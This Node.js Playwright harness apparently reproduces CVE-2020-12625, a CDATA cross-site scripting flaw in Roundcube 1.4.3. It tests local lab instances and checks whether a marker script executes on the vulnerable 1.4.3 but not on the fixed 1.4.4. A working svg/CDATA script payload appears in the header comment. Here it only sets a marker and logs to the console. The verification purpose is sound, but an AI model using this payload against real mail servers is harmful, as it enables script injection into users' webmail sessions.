#!/usr/bin/env node
/*
 * Ca C — CVE-2020-12625 (Roundcube 1.4.3 CDATA XSS) reproduction harness.
 *
 * Ground truth = actual JS execution in a headless Chromium:
 *   payload (delivered by SMTP into the lab mailbox):
 *     <svg><![CDATA[<script>window.__rqC1Xss='EXECUTED';console.log('RQ-C1-XSS-EXECUTED');</script>]]></svg>
 *   On 1.4.3 the CDATA node is emitted unescaped by rcube_washtml and the
 *   <script> reaches the browser; on 1.4.4 it is htmlspecialchars()-escaped.
 *
 * Uses the global playwright-core (browsers pinned to the cached chromium-1208).
 */
const path = require('path');
const fs = require('fs');
const PW = require(path.join(process.env.NODE_ROOT, 'playwright-core'));
const CHROME = process.env.CHROME;
const MARK = 'EXECUTED';

async function runCase(port, uid, label, shot) {
  const res = { label, port, uid, logged_in: false, attempts: [], executed: false,
                executed_in: null, console: [], dialogs: [], page_errors: [], screenshot: shot };
  const browser = await PW.chromium.launch({ headless: true, executablePath: CHROME, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  page.on('console', m => res.console.push(`[${m.type()}] ${m.text()} @${(m.location()||{}).url||''}`));
  page.on('dialog', async d => { res.dialogs.push(d.message()); try { await d.accept(); } catch (e) {} });
  page.on('pageerror', e => res.page_errors.push(String(e)));

  const base = `http://127.0.0.1:${port}`;
  // ---- login ----
  await page.goto(`${base}/?_task=login`, { waitUntil: 'domcontentloaded' });
  await page.fill('input[name="_user"]', 'test');
  await page.fill('input[name="_pass"]', 'test');
  await page.click('#rcmloginsubmit');
  await page.waitForLoadState('networkidle').catch(() => {});
  res.logged_in = !page.url().includes('_task=login');

  const urls = [
    `${base}/?_task=mail&_action=show&_uid=${uid}&_mbox=INBOX`,
    `${base}/?_task=mail&_action=show&_uid=${uid}&_mbox=INBOX&_extwin=1`,
    `${base}/?_task=mail&_mbox=INBOX&_uid=${uid}&_action=preview`,
  ];
  for (const url of urls) {
    await page.goto(url, { waitUntil: 'load' }).catch(() => {});
    await page.waitForTimeout(2500);
    // try to switch to HTML view if a toggle is present
    try {
      const toggles = await page.$$('a.show-html, a[href*="_safe=0"], a[href*="show-html"]');
      if (toggles.length) { await toggles[0].click().catch(()=>{}); await page.waitForTimeout(2000); }
    } catch (e) {}
    const frames = [];
    for (const f of page.frames()) {
      const e = { url: f.url() };
      try { e.marker = await f.evaluate('() => window.__rqC1Xss || null'); } catch (err) { e.marker = `<err>(${err.name})`; }
      try { e.hasScript = await f.evaluate(() => !!document.querySelector('script')); } catch (err) {}
      try { e.body = (await f.evaluate(() => (document.body ? document.body.innerHTML : ''))).slice(0, 400); } catch (err) { e.body = ''; }
      frames.push(e);
      if (e.marker === MARK && !res.executed) { res.executed = true; res.executed_in = f.url(); }
    }
    let html = '', hasScriptTag = false, hasCdata = false, hasMarkerText = false;
    try {
      html = await page.content();
      hasScriptTag = /<script[\s>]/i.test(html);
      hasCdata = /CDATA/i.test(html);
      hasMarkerText = /__rqC1Xss|RQ-C1-XSS-EXECUTED/.test(html);
    } catch (e) {}
    res.attempts.push({ url, frames, page_url: page.url(),
      html_len: html.length, has_script_tag: hasScriptTag, has_cdata: hasCdata,
      has_marker_text: hasMarkerText, html_head: html.slice(0, 600) });
    if (res.executed) break;
  }
  if (!res.executed && res.console.some(c => c.includes('RQ-C1-XSS-EXECUTED'))) {
    res.executed = true; res.executed_in = '(console marker)';
  }
  try { await page.screenshot({ path: shot, fullPage: true }); } catch (e) {}
  await browser.close();
  return res;
}

(async () => {
  const uid = parseInt(process.env.MSGUID || process.argv[2] || '2', 10);
  const outdir = process.env.OUTDIR || '.';
  const results = [];
  results.push(await runCase(parseInt(process.env.VULN_PORT || '18085', 10), uid,
    'roundcube-1.4.3 (vuln)', path.join(outdir, 'caC-1.4.3.png')));
  results.push(await runCase(parseInt(process.env.FIXED_PORT || '18086', 10), uid,
    'roundcube-1.4.4 (fixed)', path.join(outdir, 'caC-1.4.4.png')));
  console.log(JSON.stringify(results, null, 2));
  for (const r of results) console.error(`== ${r.label} :${r.port} -> ${r.executed ? 'XSS EXECUTED' : 'no execution'} (logged_in=${r.logged_in}, in=${r.executed_in})`);
})().catch(e => { console.error('HARNESS FAIL:', e); process.exit(1); });
